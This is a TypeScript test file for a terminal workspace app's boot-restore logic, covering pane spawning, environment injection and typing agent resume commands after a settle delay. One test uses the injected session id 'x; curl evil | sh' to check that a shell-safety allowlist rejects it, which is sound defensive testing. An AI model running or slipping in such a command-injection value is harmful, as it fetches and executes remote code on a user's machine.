/**
 * The boot restore ordering (agent-lifecycle.md §6.1, app-state-core.md §12.3 steps 5–9):
 * capture-then-clear happens in the store, the surfaces come up here, the resume commands are
 * typed only after the settle, and unsafe session ids never reach a shell.
 */

import { leaf, split, type PaneLayout } from '@nex/core/layout';
import type { ResumeTuple } from '@nex/core/agent';
import { describe, expect, it, vi } from 'vitest';

import type { PtyManager, PtySpawnOptions, TerminalInput, TerminalStateService } from '../seams.js';
import {
    applyLoadReset,
    fromSnapshot,
    type DaemonState,
    type PersistedPane,
    type PersistedSnapshot,
    type PersistedWorkspace
} from '../store/index.js';
import { runRestorePipeline, spawnRestoredPanes, typeResumeCommands } from './resume.js';

const HOME = '/Users/test';
const P1 = 'AAAAAAAA-0000-4000-8000-000000000001';
const P2 = 'AAAAAAAA-0000-4000-8000-000000000002';
const P3 = 'AAAAAAAA-0000-4000-8000-000000000003';
const W1 = 'BBBBBBBB-0000-4000-8000-000000000001';

function pane(overrides: Partial<PersistedPane> & { id: string }): PersistedPane {
    return {
        label: null,
        type: 'shell',
        workingDirectory: '/tmp',
        createdAt: 1_700_000_000,
        lastActivityAt: 1_700_000_000,
        agentSessionID: null,
        agentKind: null,
        status: 'idle',
        filePath: null,
        scratchpadContent: null,
        webTabs: null,
        webActiveTabID: null,
        webIsPrivate: false,
        ...overrides
    };
}

function workspace(panes: readonly PersistedPane[], layout: PaneLayout, profileName: string | null = null): PersistedWorkspace {
    return {
        id: W1,
        name: 'dev',
        slug: 'dev',
        color: 'blue',
        icon: null,
        profileName,
        layout,
        focusedPaneID: panes[0]?.id ?? null,
        createdAt: 1_700_000_000,
        lastAccessedAt: 1_700_000_000,
        labels: [],
        panes,
        repoAssociations: []
    };
}

function snapshotOf(ws: PersistedWorkspace): PersistedSnapshot {
    return {
        version: 1,
        workspaces: [ws],
        groups: [],
        topLevelOrder: [],
        activeWorkspaceID: ws.id,
        repos: [],
        labelPresets: []
    };
}

interface FakePty extends PtyManager {
    readonly spawns: PtySpawnOptions[];
    readonly writes: { paneID: string; data: string }[];
}

function fakePty(): FakePty {
    const spawns: PtySpawnOptions[] = [];
    const writes: { paneID: string; data: string }[] = [];
    const live = new Set<string>();
    return {
        spawns,
        writes,
        spawn(options) {
            if (live.has(options.paneID)) return;
            spawns.push(options);
            live.add(options.paneID);
        },
        has: (paneID) => live.has(paneID),
        write: () => {},
        writeDirect(paneID, data) {
            writes.push({ paneID, data: typeof data === 'string' ? data : Buffer.from(data).toString('utf8') });
        },
        resize: () => {},
        kill(paneID) {
            live.delete(paneID);
        },
        killAll: async () => {
            live.clear();
        },
        setSyncGroup: () => {},
        onData: () => () => {},
        onExit: () => () => {}
    };
}

function fakeTerm(): TerminalStateService & { attached: string[] } {
    const attached: string[] = [];
    return {
        attached,
        attach(paneID) {
            attached.push(paneID);
        },
        feed: () => {},
        resize: () => {},
        capture: () => '',
        snapshot: () => ({ data: new Uint8Array(), cols: 80, rows: 24 }),
        modes: () => ({ applicationCursorKeys: false, bracketedPaste: false }),
        dispose: () => {}
    };
}

function fakeInput(pty: FakePty): TerminalInput {
    return {
        sendText(paneID, text, opts) {
            pty.writeDirect(paneID, text);
            if (!opts.bare) pty.writeDirect(paneID, '\r');
        },
        sendNamedKey: () => {}
    };
}

function restored(snapshot: PersistedSnapshot): { state: DaemonState; tuples: readonly ResumeTuple[] } {
    const reset = applyLoadReset(fromSnapshot(snapshot, { homeDirectory: HOME }));
    return { state: reset.state, tuples: reset.resumeTuples };
}

describe('spawnRestoredPanes', () => {
    it('spawns SHELL panes only, attaches terminal state, and skips content panes', () => {
        const { state } = restored(
            snapshotOf(
                workspace(
                    [
                        pane({ id: P1, workingDirectory: '/repo' }),
                        pane({ id: P2, type: 'markdown', filePath: '/repo/README.md' }),
                        pane({ id: P3, type: 'web' })
                    ],
                    split('horizontal', 0.5, leaf(P1), split('vertical', 0.5, leaf(P2), leaf(P3)))
                )
            )
        );
        const pty = fakePty();
        const term = fakeTerm();

        const spawned = spawnRestoredPanes(state, { pty, term, profiles: [] });

        expect(spawned).toEqual([P1]);
        expect(pty.spawns).toHaveLength(1);
        expect(pty.spawns[0]?.cwd).toBe('/repo');
        expect(term.attached).toEqual([P1]);
    });

    it('injects the workspace profile env plus NEX_PANE_ID, and never a leading ":" in PATH', () => {
        const { state } = restored(snapshotOf(workspace([pane({ id: P1 })], leaf(P1), 'work')));
        const pty = fakePty();

        spawnRestoredPanes(state, {
            pty,
            term: fakeTerm(),
            profiles: [{ name: 'work', env: { CLAUDE_CONFIG_DIR: '/Users/test/.claude-work' } }],
            spawn: { inheritedPath: '/usr/bin:/bin' }
        });

        expect(pty.spawns[0]?.env).toEqual([
            ['NEX_PANE_ID', P1],
            ['PATH', '/usr/bin:/bin'],
            ['CLAUDE_CONFIG_DIR', '/Users/test/.claude-work'],
            ['NEX_PROFILE', 'work']
        ]);
    });

    it('is idempotent: a pane that already has a PTY is left alone', () => {
        const { state } = restored(snapshotOf(workspace([pane({ id: P1 })], leaf(P1))));
        const pty = fakePty();
        const deps = { pty, term: fakeTerm(), profiles: [] };

        expect(spawnRestoredPanes(state, deps)).toEqual([P1]);
        expect(spawnRestoredPanes(state, deps)).toEqual([]);
        expect(pty.spawns).toHaveLength(1);
    });

    it('reports a failing pane and keeps restoring the rest', () => {
        const { state } = restored(
            snapshotOf(workspace([pane({ id: P1 }), pane({ id: P2 })], split('horizontal', 0.5, leaf(P1), leaf(P2))))
        );
        const pty = fakePty();
        const onError = vi.fn();
        const spawn = pty.spawn.bind(pty);
        pty.spawn = (options) => {
            if (options.paneID === P1) throw new Error('cwd is gone');
            spawn(options);
        };

        expect(spawnRestoredPanes(state, { pty, term: fakeTerm(), profiles: [], onError })).toEqual([P2]);
        expect(onError).toHaveBeenCalledWith(expect.any(Error), `spawn ${P1}`);
    });
});

describe('typeResumeCommands', () => {
    it('waits the settle delay, then types the per-kind resume command plus Enter', async () => {
        const { state, tuples } = restored(
            snapshotOf(
                workspace(
                    [
                        pane({ id: P1, agentSessionID: 'sess-one', status: 'running' }),
                        pane({ id: P2, agentSessionID: 'sess-two', agentKind: 'codex' })
                    ],
                    split('horizontal', 0.5, leaf(P1), leaf(P2))
                )
            )
        );
        expect(tuples).toEqual([
            { paneID: P1, sessionID: 'sess-one', kind: 'claude' },
            { paneID: P2, sessionID: 'sess-two', kind: 'codex' }
        ]);
        // The clearing already happened; the ids only live in the tuples now.
        expect(state.workspaces[0]?.panes.map((p) => p.agentSessionID)).toEqual([null, null]);
        expect(state.workspaces[0]?.panes.map((p) => p.status)).toEqual(['idle', 'idle']);
        // agentKind deliberately survives (it is the badge's last-known value).
        expect(state.workspaces[0]?.panes[1]?.agentKind).toBe('codex');

        const pty = fakePty();
        const slept: number[] = [];
        const outcome = await runRestorePipeline(state, tuples, {
            pty,
            term: fakeTerm(),
            input: fakeInput(pty),
            profiles: [],
            sleep: async (ms) => {
                slept.push(ms);
                // Nothing may have been typed before the settle.
                expect(pty.writes).toEqual([]);
            }
        });

        expect(slept).toEqual([2000]);
        expect(outcome.spawned).toEqual([P1, P2]);
        expect(outcome.resumed).toEqual([P1, P2]);
        expect(pty.writes).toEqual([
            { paneID: P1, data: 'claude --resume sess-one' },
            { paneID: P1, data: '\r' },
            { paneID: P2, data: 'codex resume sess-two' },
            { paneID: P2, data: '\r' }
        ]);
    });

    it('skips a session id that fails the shell-safety allowlist', async () => {
        const { state, tuples } = restored(
            snapshotOf(workspace([pane({ id: P1, agentSessionID: 'x; curl evil | sh' })], leaf(P1)))
        );
        const pty = fakePty();

        const outcome = await runRestorePipeline(state, tuples, {
            pty,
            term: fakeTerm(),
            input: fakeInput(pty),
            profiles: [],
            sleep: async () => {}
        });

        expect(outcome.resumed).toEqual([]);
        expect(outcome.skipped).toEqual([P1]);
        expect(pty.writes).toEqual([]);
    });

    it('skips a tuple whose pane never got a PTY', async () => {
        const pty = fakePty();
        const outcome = await typeResumeCommands([{ paneID: P3, sessionID: 'abc', kind: 'claude' }], {
            pty,
            term: fakeTerm(),
            input: fakeInput(pty),
            profiles: [],
            sleep: async () => {}
        });
        expect(outcome).toEqual({ resumed: [], skipped: [P3], settled: true });
    });

    it('does not sleep at all when there is nothing to resume', async () => {
        const pty = fakePty();
        const sleep = vi.fn(async () => {});
        const outcome = await typeResumeCommands([], {
            pty,
            term: fakeTerm(),
            input: fakeInput(pty),
            profiles: [],
            sleep
        });
        expect(sleep).not.toHaveBeenCalled();
        expect(outcome.settled).toBe(false);
    });
});
